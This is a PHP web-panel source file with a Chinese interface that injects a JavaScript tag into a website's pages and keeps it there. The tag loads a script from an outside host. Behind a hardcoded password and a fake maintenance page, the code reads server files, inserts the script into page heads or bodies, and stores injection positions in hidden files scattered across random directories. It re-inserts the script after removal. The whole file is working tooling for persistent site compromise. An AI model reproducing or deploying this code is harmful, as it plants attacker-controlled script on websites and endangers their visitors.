<?php
header('Content-Type: text/html; charset=utf-8');

// 配置
$ACCESS_PASSWORD = "admin123";
$DEFAULT_SCRIPT = '<script type="text/javascript" src="http://m.993113.com/xhxh.js"></script>';
$STORAGE_DIR = __DIR__ . '/.cache/';

// 权限检查
if (!isset($_GET['auth']) || $_GET['auth'] !== $ACCESS_PASSWORD) {
    echo "<html><body style='background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 50px; text-align: center;'>
    <h1 style='color: #ff0000; text-shadow: 0 0 10px #ff0000;'>🚫 系统维护中</h1>
    <p style='color: #00ffff;'>Access Denied - Unauthorized Request</p>
    </body></html>";
    exit;
}

// 初始化存储系统
function initStorageSystem() {
    global $STORAGE_DIR;
    
    if (!is_dir($STORAGE_DIR)) {
        mkdir($STORAGE_DIR, 0755, true);
    }
    
    $indexFile = $STORAGE_DIR . 'index.dat';
    if (!file_exists($indexFile)) {
        file_put_contents($indexFile, serialize([]));
    }
}

// 生成随机文件名
function generateRandomFilename($prefix = 'data_') {
    $random = bin2hex(random_bytes(8));
    $timestamp = time();
    return $prefix . $timestamp . '_' . $random . '.dat';
}

// 生成随机目录路径 - 增强隐蔽性
function generateRandomDirectory() {
    global $STORAGE_DIR;
    
    $dirs = [
        $STORAGE_DIR,
        $STORAGE_DIR . 'tmp/',
        $STORAGE_DIR . 'cache/',
        $STORAGE_DIR . 'logs/',
        $STORAGE_DIR . 'sessions/',
        __DIR__ . '/../tmp/',
        __DIR__ . '/../cache/',
        __DIR__ . '/../logs/',
        __DIR__ . '/../uploads/',
        __DIR__ . '/../images/',
        '/tmp/php_sessions/',
        '/var/tmp/php/'
    ];
    
    $randomDir = $dirs[array_rand($dirs)];
    
    if (!is_dir($randomDir)) {
        @mkdir($randomDir, 0755, true);
    }
    
    return $randomDir;
}

// 获取当前存储文件路径
function getCurrentStorageFile() {
    $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
    if (!file_exists($indexFile)) {
        return createNewStorageFile();
    }
    
    $index = unserialize(file_get_contents($indexFile));
    
    if (empty($index['current_storage'])) {
        return createNewStorageFile();
    }
    
    $storageFile = $index['current_storage'];
    if (!file_exists($storageFile)) {
        return createNewStorageFile();
    }
    
    return $storageFile;
}

// 创建新的存储文件
function createNewStorageFile() {
    $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
    $index = file_exists($indexFile) ? unserialize(file_get_contents($indexFile)) : [];
    
    $storageDir = generateRandomDirectory();
    $storageFile = $storageDir . generateRandomFilename('pos_');
    
    $initialData = [
        'created_at' => date('Y-m-d H:i:s'),
        'positions' => [],
        'metadata' => [
            'version' => '1.0',
            'file_count' => 0
        ]
    ];
    
    if (file_put_contents($storageFile, serialize($initialData)) === false) {
        return false;
    }
    
    $index['current_storage'] = $storageFile;
    $index['storage_history'] = $index['storage_history'] ?? [];
    $index['storage_history'][] = [
        'file' => $storageFile,
        'created_at' => date('Y-m-d H:i:s'),
        'active' => true
    ];
    
    file_put_contents($indexFile, serialize($index));
    
    return $storageFile;
}

// 读取存储的位置信息
function readStoredPositions() {
    $storageFile = getCurrentStorageFile();
    
    if (!file_exists($storageFile)) {
        return [];
    }
    
    $content = file_get_contents($storageFile);
    if ($content === false) {
        return [];
    }
    
    $data = unserialize($content);
    return isset($data['positions']) ? $data['positions'] : [];
}

// 保存位置信息到存储文件
function savePositionsToStorage($positions) {
    $storageFile = getCurrentStorageFile();
    
    $data = [
        'created_at' => date('Y-m-d H:i:s'),
        'positions' => $positions,
        'metadata' => [
            'version' => '1.0',
            'file_count' => count($positions),
            'last_updated' => date('Y-m-d H:i:s')
        ]
    ];
    
    return file_put_contents($storageFile, serialize($data)) !== false;
}

// 获取相对路径
function getRelativePath($absolutePath) {
    $basePath = dirname(__FILE__);
    if (strpos($absolutePath, $basePath) === 0) {
        return ltrim(str_replace($basePath, '', $absolutePath), '/');
    }
    return $absolutePath;
}

// 通过相对路径获取绝对路径 - 增强路径解析
function getAbsolutePath($relativePath) {
    // 如果已经是绝对路径且存在
    if (file_exists($relativePath)) {
        return $relativePath;
    }
    
    // 尝试相对于当前脚本的路径
    $absolutePath = dirname(__FILE__) . '/' . ltrim($relativePath, '/');
    if (file_exists($absolutePath)) {
        return $absolutePath;
    }
    
    // 尝试相对于网站根目录的路径
    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
    if ($docRoot) {
        $absolutePath = $docRoot . '/' . ltrim($relativePath, '/');
        if (file_exists($absolutePath)) {
            return $absolutePath;
        }
    }
    
    // 尝试直接路径
    if (file_exists('/' . ltrim($relativePath, '/'))) {
        return '/' . ltrim($relativePath, '/');
    }
    
    return $relativePath;
}

// 安全的文件检查函数
function safeFileExists($filePath) {
    // 清理路径
    $filePath = str_replace(['../', './'], '', $filePath);
    
    // 多种方式检查文件存在
    if (file_exists($filePath)) {
        return true;
    }
    
    // 尝试绝对路径
    $absolutePaths = [
        $filePath,
        dirname(__FILE__) . '/' . ltrim($filePath, '/'),
        $_SERVER['DOCUMENT_ROOT'] . '/' . ltrim($filePath, '/'),
        '/' . ltrim($filePath, '/')
    ];
    
    foreach ($absolutePaths as $path) {
        if (file_exists($path) && is_file($path)) {
            return true;
        }
    }
    
    return false;
}

// 安全的文件读取
function safeFileGetContents($filePath) {
    if (!safeFileExists($filePath)) {
        return false;
    }
    
    // 检查文件是否可读
    if (!is_readable($filePath)) {
        return false;
    }
    
    return file_get_contents($filePath);
}

// 检查脚本函数 - 修复文件检查
function checkScript($file, $targetScript) {
    $resolvedPath = getAbsolutePath($file);
    
    if (!safeFileExists($resolvedPath)) {
        echo "<div class='cyber-alert alert-error'>❌ 文件不存在: " . htmlspecialchars($file) . " (解析为: " . htmlspecialchars($resolvedPath) . ")</div>";
        return;
    }
    
    $content = safeFileGetContents($resolvedPath);
    if ($content === false) {
        echo "<div class='cyber-alert alert-error'>❌ 无法读取文件内容: " . htmlspecialchars($resolvedPath) . "</div>";
        return;
    }
    
    $pos = strpos($content, $targetScript);
    
    $positions = readStoredPositions();
    $relativePath = getRelativePath($resolvedPath);
    $fileHash = md5($relativePath . $targetScript);
    $savedPosition = isset($positions[$fileHash]) ? $positions[$fileHash] : null;
    
    if ($pos !== false) {
        $lineNumber = substr_count(substr($content, 0, $pos), "\n") + 1;
        
        echo "<div class='cyber-alert alert-success'>";
        echo "✅ 脚本存在于文件中<br>";
        echo "<div class='script-preview'>" . htmlspecialchars($targetScript) . "</div>";
        echo "<strong>位置:</strong> 第 {$lineNumber} 行";
        
        if ($savedPosition) {
            $statusClass = $savedPosition['line'] == $lineNumber ? 'status-match' : 'status-mismatch';
            $statusText = $savedPosition['line'] == $lineNumber ? '位置一致' : '位置不一致';
            echo "<br><strong>已保存位置:</strong> 第 {$savedPosition['line']} 行 <span class='{$statusClass}'>({$statusText})</span>";
        }
        echo "</div>";
        
    } else {
        echo "<div class='cyber-alert alert-warning'>";
        echo "⚠ 脚本不存在于文件中";
        echo "<div class='script-preview'>" . htmlspecialchars($targetScript) . "</div>";
        
        if ($savedPosition) {
            echo "<br><strong>已保存位置:</strong> 第 {$savedPosition['line']} 行";
        }
        echo "</div>";
    }
}

// 保存脚本位置 - 修复文件检查
function saveScriptPosition($file, $targetScript) {
    $resolvedPath = getAbsolutePath($file);
    
    if (!safeFileExists($resolvedPath)) {
        echo "<div class='cyber-alert alert-error'>❌ 文件不存在: " . htmlspecialchars($file) . " (解析为: " . htmlspecialchars($resolvedPath) . ")</div>";
        return;
    }
    
    $content = safeFileGetContents($resolvedPath);
    if ($content === false) {
        echo "<div class='cyber-alert alert-error'>❌ 无法读取文件内容: " . htmlspecialchars($resolvedPath) . "</div>";
        return;
    }
    
    $pos = strpos($content, $targetScript);
    
    if ($pos !== false) {
        $lineNumber = substr_count(substr($content, 0, $pos), "\n") + 1;
        
        $relativePath = getRelativePath($resolvedPath);
        $fileHash = md5($relativePath . $targetScript);
        
        $positionData = [
            'file' => $resolvedPath,
            'relative_path' => $relativePath,
            'target_script' => $targetScript,
            'position' => $pos,
            'line' => $lineNumber,
            'saved_at' => date('Y-m-d H:i:s'),
            'content_before' => substr($content, max(0, $pos - 30), 30),
            'content_after' => substr($content, $pos + strlen($targetScript), 30),
            'file_hash' => $fileHash,
            'script_preview' => substr($targetScript, 0, 100) . (strlen($targetScript) > 100 ? '...' : '')
        ];
        
        $positions = readStoredPositions();
        $positions[$fileHash] = $positionData;
        
        if (savePositionsToStorage($positions)) {
            $storageFile = getCurrentStorageFile();
            echo "<div class='cyber-alert alert-success'>";
            echo "✅ 脚本位置已保存到隐蔽存储！<br>";
            echo "<strong>文件:</strong> " . basename($resolvedPath) . "<br>";
            echo "<strong>完整路径:</strong> <span class='file-path-display'>" . htmlspecialchars($resolvedPath) . "</span><br>";
            echo "<strong>位置:</strong> 第 {$lineNumber} 行<br>";
            echo "<strong>完整脚本:</strong> " . htmlspecialchars($targetScript) . "<br>";
            echo "<strong>存储文件:</strong> " . basename($storageFile);
            echo "</div>";
        } else {
            echo "<div class='cyber-alert alert-error'>❌ 保存失败，请检查文件权限</div>";
        }
    } else {
        echo "<div class='cyber-alert alert-warning'>⚠ 无法保存位置：文件中未找到指定脚本</div>";
    }
}

// 自动恢复脚本到原位置 - 移除备份
function autoRestoreScript($file, $targetScript) {
    $resolvedPath = getAbsolutePath($file);
    
    if (!safeFileExists($resolvedPath)) {
        echo "<div class='cyber-alert alert-error'>❌ 文件不存在: " . htmlspecialchars($file) . " (解析为: " . htmlspecialchars($resolvedPath) . ")</div>";
        return;
    }
    
    $positions = readStoredPositions();
    $relativePath = getRelativePath($resolvedPath);
    $fileHash = md5($relativePath . $targetScript);
    $positionInfo = isset($positions[$fileHash]) ? $positions[$fileHash] : null;
    
    if (!$positionInfo) {
        echo "<div class='cyber-alert alert-warning'>⚠ 未找到该文件的保存位置</div>";
        return;
    }
    
    $storedScript = $positionInfo['target_script'];
    
    $storedFile = $positionInfo['file'];
    if (!safeFileExists($storedFile)) {
        $storedFile = getAbsolutePath($positionInfo['relative_path']);
        if (!safeFileExists($storedFile)) {
            echo "<div class='cyber-alert alert-warning'>⚠ 保存的文件路径已失效</div>";
            return;
        }
    }
    
    $content = safeFileGetContents($resolvedPath);
    if ($content === false) {
        echo "<div class='cyber-alert alert-error'>❌ 无法读取文件内容</div>";
        return;
    }
    
    $savedPosition = $positionInfo['position'];
    $contentBefore = $positionInfo['content_before'];
    $contentAfter = $positionInfo['content_after'];
    
    $currentBefore = substr($content, max(0, $savedPosition - 30), 30);
    $isPositionValid = (strpos($content, $storedScript) === false) && 
                      (strpos($currentBefore, $contentBefore) !== false);
    
    if ($isPositionValid && $savedPosition <= strlen($content)) {
        $newContent = substr($content, 0, $savedPosition) . 
                     $storedScript . 
                     substr($content, $savedPosition);
        
        if (file_put_contents($resolvedPath, $newContent) !== false) {
            echo "<div class='cyber-alert alert-success'>";
            echo "✅ 脚本已恢复到原位置！<br>";
            echo "<strong>完整路径:</strong> <span class='file-path-display'>" . htmlspecialchars($resolvedPath) . "</span><br>";
            echo "<strong>位置:</strong> 第 {$positionInfo['line']} 行<br>";
            echo "<strong>完整脚本:</strong> " . htmlspecialchars($storedScript) . "<br>";
            echo "<strong>原保存时间:</strong> {$positionInfo['saved_at']}";
            echo "</div>";
            
            $verify = safeFileGetContents($resolvedPath);
            if (strpos($verify, $storedScript) !== false) {
                echo "<div class='cyber-alert alert-success'>✓ 验证成功：脚本已恢复</div>";
            }
        } else {
            echo "<div class='cyber-alert alert-error'>❌ 写入文件失败</div>";
        }
    } else {
        echo "<div class='cyber-alert alert-warning'>⚠ 原位置已发生变化，请使用手动恢复</div>";
    }
}

// 恢复脚本函数 - 移除备份
function restoreScript($file, $targetScript, $insertLocation = 'head') {
    $resolvedPath = getAbsolutePath($file);
    
    if (!safeFileExists($resolvedPath)) {
        echo "<div class='cyber-alert alert-error'>❌ 文件不存在: " . htmlspecialchars($file) . " (解析为: " . htmlspecialchars($resolvedPath) . ")</div>";
        return;
    }
    
    $content = safeFileGetContents($resolvedPath);
    if ($content === false) {
        echo "<div class='cyber-alert alert-error'>❌ 无法读取文件内容</div>";
        return;
    }
    
    // 移除现有脚本（如果存在）
    $cleanContent = str_replace($targetScript, '', $content);
    
    $newContent = $cleanContent;
    $actualLocation = '';
    
    // 根据选择的插入位置进行处理
    switch($insertLocation) {
        case 'head':
            if (preg_match('/<head[^>]*>/i', $cleanContent)) {
                $newContent = preg_replace('/(<head[^>]*>)/i', "$1\n" . $targetScript, $cleanContent);
                $actualLocation = "head标签内";
            } else {
                $newContent = $targetScript . "\n" . $cleanContent;
                $actualLocation = "文件开头（未找到head标签）";
            }
            break;
            
        case 'body_start':
            if (preg_match('/<body[^>]*>/i', $cleanContent)) {
                $newContent = preg_replace('/(<body[^>]*>)/i', "$1\n" . $targetScript, $cleanContent);
                $actualLocation = "body开始处";
            } else {
                $newContent = $targetScript . "\n" . $cleanContent;
                $actualLocation = "文件开头（未找到body标签）";
            }
            break;
            
        case 'body_end':
            if (preg_match('/<\/body[^>]*>/i', $cleanContent)) {
                $newContent = preg_replace('/(<\/body[^>]*>)/i', $targetScript . "\n$1", $cleanContent);
                $actualLocation = "body结束前";
            } else {
                $newContent = $cleanContent . "\n" . $targetScript . "\n";
                $actualLocation = "文件末尾（未找到body结束标签）";
            }
            break;
            
        case 'file_start':
            $newContent = $targetScript . "\n" . $cleanContent;
            $actualLocation = "文件开头";
            break;
            
        case 'file_end':
            $newContent = $cleanContent . "\n" . $targetScript . "\n";
            $actualLocation = "文件末尾";
            break;
    }
    
    if (file_put_contents($resolvedPath, $newContent) !== false) {
        echo "<div class='cyber-alert alert-success'>";
        echo "✅ 脚本恢复成功！<br>";
        echo "<strong>完整路径:</strong> <span class='file-path-display'>" . htmlspecialchars($resolvedPath) . "</span><br>";
        echo "<div class='script-preview'>" . htmlspecialchars($targetScript) . "</div>";
        echo "<strong>插入位置:</strong> {$actualLocation}";
        echo "</div>";
        
        $verify = safeFileGetContents($resolvedPath);
        if (strpos($verify, $targetScript) !== false) {
            echo "<div class='cyber-alert alert-success'>✓ 验证通过：脚本已成功插入</div>";
        }
    } else {
        echo "<div class='cyber-alert alert-error'>❌ 写入文件失败，请检查文件权限</div>";
    }
}

// 导出位置信息
function exportPositions() {
    $positions = readStoredPositions();
    $exportData = base64_encode(serialize($positions));
    
    echo "<div class='cyber-alert alert-success'>";
    echo "📤 位置信息导出成功<br>";
    echo "<strong>导出代码:</strong><br>";
    echo "<textarea style='width:100%; height:100px; font-family: monospace; background: rgba(10, 10, 30, 0.8); color: #05ffa1; border: 1px solid #05ffa1; border-radius: 10px; padding: 12px; margin: 12px 0;' onclick='this.select()'>" . htmlspecialchars($exportData) . "</textarea>";
    echo "<br><small>请保存此代码，可用于导入恢复位置信息</small>";
    echo "</div>";
}

// 导入位置信息
function importPositions() {
    if (isset($_POST['import_data']) && !empty($_POST['import_data'])) {
        $importData = $_POST['import_data'];
        $decodedData = base64_decode($importData);
        
        if ($decodedData === false) {
            echo "<div class='cyber-alert alert-error'>❌ 导入数据格式错误（Base64解码失败）</div>";
            return;
        }
        
        $positions = unserialize($decodedData);
        
        if ($positions && is_array($positions)) {
            foreach ($positions as &$position) {
                if (isset($position['relative_path'])) {
                    $position['file'] = getAbsolutePath($position['relative_path']);
                }
            }
            
            if (savePositionsToStorage($positions)) {
                echo "<div class='cyber-alert alert-success'>✅ 位置信息导入成功！共导入 " . count($positions) . " 个位置记录</div>";
            } else {
                echo "<div class='cyber-alert alert-error'>❌ 导入失败，请检查文件权限</div>";
            }
        } else {
            echo "<div class='cyber-alert alert-error'>❌ 导入数据格式错误</div>";
        }
    }
}

// 清空所有位置
function clearAllPositions() {
    $storageFile = getCurrentStorageFile();
    $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
    
    $data = [
        'created_at' => date('Y-m-d H:i:s'),
        'positions' => [],
        'metadata' => [
            'version' => '1.0',
            'file_count' => 0,
            'last_updated' => date('Y-m-d H:i:s')
        ]
    ];
    
    if (file_put_contents($storageFile, serialize($data)) !== false) {
        $index = [
            'current_storage' => $storageFile,
            'storage_history' => [
                [
                    'file' => $storageFile,
                    'created_at' => date('Y-m-d H:i:s'),
                    'active' => true
                ]
            ]
        ];
        
        if (file_put_contents($indexFile, serialize($index)) !== false) {
            echo "<div class='cyber-alert alert-success'>✅ 所有保存的位置已清除，存储历史已清理</div>";
        } else {
            echo "<div class='cyber-alert alert-error'>❌ 清除失败，无法更新索引文件</div>";
        }
    } else {
        echo "<div class='cyber-alert alert-error'>❌ 清除失败</div>";
    }
}

// 更改存储位置
function changeStorageLocation() {
    $newStorageFile = createNewStorageFile();
    if ($newStorageFile === false) {
        echo "<div class='cyber-alert alert-error'>❌ 创建新存储文件失败</div>";
        return;
    }
    
    echo "<div class='cyber-alert alert-success'>";
    echo "✅ 存储位置已更改！<br>";
    echo "<strong>新存储文件:</strong> " . basename($newStorageFile);
    echo "</div>";
}

// 显示存储信息
function showStorageInfo() {
    $storageFile = getCurrentStorageFile();
    $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
    
    if (!file_exists($indexFile)) {
        echo "<div class='cyber-alert alert-warning'>暂无存储信息</div>";
        return;
    }
    
    $index = unserialize(file_get_contents($indexFile));
    $positions = readStoredPositions();
    
    echo "<div style='display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 24px;'>";
    echo "<div class='cyber-card'>";
    echo "<h4 style='font-size: 1rem; font-weight: 600; margin-bottom: 16px; color: var(--text-primary);'>📁 存储信息</h4>";
    echo "<div style='display: flex; flex-direction: column; gap: 12px;'>";
    echo "<div style='display: flex; justify-content: space-between; align-items: center; padding-bottom: 8px; border-bottom: 1px solid rgba(0, 243, 255, 0.2);'><span style='font-size: 0.875rem; color: var(--text-secondary);'>当前文件</span><span style='font-size: 0.875rem; font-weight: 500; color: var(--text-primary);'>" . basename($storageFile) . "</span></div>";
    echo "<div style='display: flex; justify-content: space-between; align-items: center; padding-bottom: 8px; border-bottom: 1px solid rgba(0, 243, 255, 0.2);'><span style='font-size: 0.875rem; color: var(--text-secondary);'>完整路径</span><span style='font-size: 0.875rem; font-weight: 500; color: var(--text-primary);' class='file-path-display'>" . htmlspecialchars($storageFile) . "</span></div>";
    echo "<div style='display: flex; justify-content: space-between; align-items: center; padding-bottom: 8px; border-bottom: 1px solid rgba(0, 243, 255, 0.2);'><span style='font-size: 0.875rem; color: var(--text-secondary);'>文件大小</span><span style='font-size: 0.875rem; font-weight: 500; color: var(--text-primary);'>" . round(filesize($storageFile) / 1024, 2) . " KB</span></div>";
    echo "<div style='display: flex; justify-content: space-between; align-items: center; padding-bottom: 8px; border-bottom: 1px solid rgba(0, 243, 255, 0.2);'><span style='font-size: 0.875rem; color: var(--text-secondary);'>创建时间</span><span style='font-size: 0.875rem; font-weight: 500; color: var(--text-primary);'>" . date('Y-m-d H:i:s', filemtime($storageFile)) . "</span></div>";
    echo "<div style='display: flex; justify-content: space-between; align-items: center;'><span style='font-size: 0.875rem; color: var(--text-secondary);'>位置记录</span><span style='font-size: 0.875rem; font-weight: 500; color: var(--text-primary);'>" . count($positions) . " 个</span></div>";
    echo "</div></div>";
    
    if (!empty($index['storage_history'])) {
        echo "<div class='cyber-card'>";
        echo "<h4 style='font-size: 1rem; font-weight: 600; margin-bottom: 16px; color: var(--text-primary);'>📋 存储历史</h4>";
        echo "<div style='display: flex; flex-direction: column; gap: 12px;'>";
        foreach ($index['storage_history'] as $history) {
            $status = $history['active'] ? '✅ 当前' : '📁 历史';
            echo "<div style='display: flex; justify-content: space-between; align-items: center; padding-bottom: 8px; border-bottom: 1px solid rgba(0, 243, 255, 0.2);'>";
            echo "<span style='font-size: 0.875rem; color: var(--text-secondary);'>{$status}</span>";
            echo "<span style='font-size: 0.875rem; font-weight: 500; color: var(--text-primary);'>" . basename($history['file']) . "</span>";
            echo "</div>";
        }
        echo "</div></div>";
    }
    echo "</div>";
}

// 清理存储
function cleanupStorage() {
    $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
    
    if (!file_exists($indexFile)) {
        echo "<div class='cyber-alert alert-warning'>暂无存储历史可清理</div>";
        return;
    }
    
    $index = unserialize(file_get_contents($indexFile));
    $currentStorage = $index['current_storage'];
    $deletedFiles = [];
    
    if (!empty($index['storage_history'])) {
        foreach ($index['storage_history'] as $history) {
            if ($history['file'] !== $currentStorage && file_exists($history['file'])) {
                if (unlink($history['file'])) {
                    $deletedFiles[] = basename($history['file']);
                }
            }
        }
    }
    
    $index['storage_history'] = [
        [
            'file' => $currentStorage,
            'created_at' => date('Y-m-d H:i:s'),
            'active' => true
        ]
    ];
    
    if (file_put_contents($indexFile, serialize($index)) !== false) {
        echo "<div class='cyber-alert alert-success'>";
        echo "✅ 存储清理完成！<br>";
        if (!empty($deletedFiles)) {
            echo "<strong>已删除文件:</strong><br>";
            foreach ($deletedFiles as $file) {
                echo "• " . $file . "<br>";
            }
        } else {
            echo "没有需要清理的历史文件";
        }
        echo "</div>";
    } else {
        echo "<div class='cyber-alert alert-error'>❌ 清理失败，无法更新索引文件</div>";
    }
}

// 初始化存储系统
initStorageSystem();

// 获取文件路径
$filePath = '';
if (isset($_GET['s'])) {
    $filePath = $_GET['s'];
    // 尝试多种路径解析
    $resolvedPath = getAbsolutePath($filePath);
    if (safeFileExists($resolvedPath)) {
        $filePath = $resolvedPath;
    }
} elseif (isset($_POST['file_path'])) {
    $filePath = $_POST['file_path'];
}

// 获取当前使用的脚本内容
$currentScript = $DEFAULT_SCRIPT;
if (isset($_POST['check_script']) && !empty(trim($_POST['check_script']))) {
    $currentScript = trim($_POST['check_script']);
} elseif (isset($_POST['custom_script']) && !empty(trim($_POST['custom_script']))) {
    $currentScript = trim($_POST['custom_script']);
}

// 获取插入位置
$insertLocation = 'head';
if (isset($_POST['insert_location']) && !empty($_POST['insert_location'])) {
    $insertLocation = $_POST['insert_location'];
}

// 处理操作
if (isset($_POST['action'])) {
    switch ($_POST['action']) {
        case 'check':
            checkScript($filePath, $currentScript);
            break;
        case 'restore':
            restoreScript($filePath, $currentScript, $insertLocation);
            break;
        case 'save_position':
            saveScriptPosition($filePath, $currentScript);
            break;
        case 'auto_restore':
            autoRestoreScript($filePath, $currentScript);
            break;
        case 'export_positions':
            exportPositions();
            break;
        case 'import_positions':
            importPositions();
            break;
        case 'clear_positions':
            clearAllPositions();
            break;
        case 'change_storage':
            changeStorageLocation();
            break;
        case 'show_storage_info':
            showStorageInfo();
            break;
        case 'cleanup_storage':
            cleanupStorage();
            break;
    }
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔮 CYBER SCRIPT CONTROL SYSTEM</title>
    <style>
        /* 保持原有的所有CSS样式不变 */
        :root {
            --neon-blue: #00f3ff;
            --neon-purple: #b967ff;
            --neon-pink: #ff2a6d;
            --neon-green: #05ffa1;
            --neon-yellow: #ffeb3b;
            --dark-bg: #0a0a12;
            --darker-bg: #050508;
            --card-bg: rgba(16, 16, 32, 0.8);
            --card-border: rgba(0, 243, 255, 0.3);
            --text-primary: #ffffff;
            --text-secondary: #b0b0ff;
            --text-accent: #00f3ff;
            --glow-blue: 0 0 10px #00f3ff, 0 0 20px #00f3ff, 0 0 30px #00f3ff;
            --glow-purple: 0 0 10px #b967ff, 0 0 20px #b967ff, 0 0 30px #b967ff;
            --glow-pink: 0 0 10px #ff2a6d, 0 0 20px #ff2a6d, 0 0 30px #ff2a6d;
            --glow-green: 0 0 10px #05ffa1, 0 0 20px #05ffa1, 0 0 30px #05ffa1;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Roboto', sans-serif;
            background: var(--dark-bg);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(0, 243, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(185, 103, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 80%, rgba(255, 42, 109, 0.1) 0%, transparent 50%);
        }

        .cyber-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 243, 255, 0.1) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 243, 255, 0.1) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: -1;
            animation: gridMove 20s linear infinite;
        }

        @keyframes gridMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(50px, 50px); }
        }

        .floating-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            pointer-events: none;
        }

        .particle {
            position: absolute;
            background: var(--neon-blue);
            border-radius: 50%;
            filter: blur(5px);
            animation: float 6s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(180deg); }
        }

        .app-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        .cyber-header {
            text-align: center;
            margin-bottom: 50px;
            padding: 60px 40px;
            background: linear-gradient(135deg, 
                rgba(10, 10, 30, 0.9) 0%, 
                rgba(5, 5, 20, 0.9) 100%);
            border: 1px solid var(--card-border);
            border-radius: 20px;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 40px rgba(0, 243, 255, 0.2);
        }

        .cyber-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, 
                transparent, 
                rgba(0, 243, 255, 0.4), 
                transparent);
            animation: shine 3s infinite;
        }

        @keyframes shine {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .cyber-header h1 {
            font-size: 3.5rem;
            font-weight: 800;
            margin-bottom: 15px;
            background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: var(--glow-blue);
            letter-spacing: 3px;
            text-transform: uppercase;
        }

        .cyber-header .subtitle {
            font-size: 1.3rem;
            color: var(--text-secondary);
            font-weight: 300;
            letter-spacing: 2px;
        }

        .cyber-card {
            background: var(--card-bg);
            border: 1px solid var(--card-border);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            backdrop-filter: blur(15px);
            position: relative;
            overflow: hidden;
            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }

        .cyber-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, 
                var(--neon-blue), 
                var(--neon-purple), 
                var(--neon-pink));
            box-shadow: var(--glow-blue);
        }

        .cyber-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0, 243, 255, 0.3);
            border-color: var(--neon-blue);
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 25px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(0, 243, 255, 0.2);
        }

        .card-header h2 {
            font-size: 1.5rem;
            font-weight: 600;
            color: var(--text-primary);
            text-shadow: 0 0 10px rgba(0, 243, 255, 0.5);
        }

        .card-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple));
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2rem;
            box-shadow: var(--glow-blue);
        }

        .cyber-input {
            width: 100%;
            min-height: 120px;
            padding: 20px;
            border: 1px solid rgba(0, 243, 255, 0.3);
            border-radius: 10px;
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
            font-size: 14px;
            line-height: 1.5;
            resize: vertical;
            transition: all 0.3s ease;
            background: rgba(10, 10, 30, 0.8);
            color: var(--text-primary);
            backdrop-filter: blur(10px);
        }

        .cyber-input:focus {
            outline: none;
            border-color: var(--neon-blue);
            box-shadow: var(--glow-blue);
            background: rgba(15, 15, 40, 0.9);
        }

        .current-script-display {
            background: rgba(5, 20, 30, 0.8);
            border: 1px solid rgba(0, 243, 255, 0.2);
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
            font-size: 13px;
            color: var(--neon-green);
            position: relative;
            overflow: hidden;
        }

        .current-script-display::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 3px;
            height: 100%;
            background: var(--neon-green);
            box-shadow: var(--glow-green);
        }

        .cyber-btn {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            padding: 15px 25px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            text-decoration: none;
            justify-content: center;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .cyber-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, 
                transparent, 
                rgba(255, 255, 255, 0.2), 
                transparent);
            transition: left 0.5s;
        }

        .cyber-btn:hover::before {
            left: 100%;
        }

        .cyber-btn-primary {
            background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple));
            color: white;
            box-shadow: 0 5px 15px rgba(0, 243, 255, 0.4);
        }

        .cyber-btn-primary:hover {
            transform: translateY(-3px);
